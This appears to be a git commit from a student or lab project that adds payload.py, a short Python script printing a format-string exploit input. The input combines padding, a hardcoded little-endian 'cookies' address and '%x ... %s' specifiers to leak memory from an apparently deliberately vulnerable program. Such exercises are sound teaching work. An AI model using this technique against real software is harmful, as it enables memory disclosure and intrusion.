f4fb233f0472ca5efcf25c4ed199a990afa5a64e
Miriam Ramírez <91801346+MiriamRZ03@users.noreply.github.com>
2024-03-15 12:39:06 -0600

    Añadiendo payload para nuestro programa

---
+++ payload.py
@@ -0,0 +1,9 @@
+# -*- coding: utf-8 
+#payload.py
+
+#Dirección de cookies:                  0804a024
+#Dirección de cookies al revés:         24a00408
+
+output = "A" * 4 + "\x24\xa0\x04\x08" + "%x %x %x %x %s"
+print (output) 
+
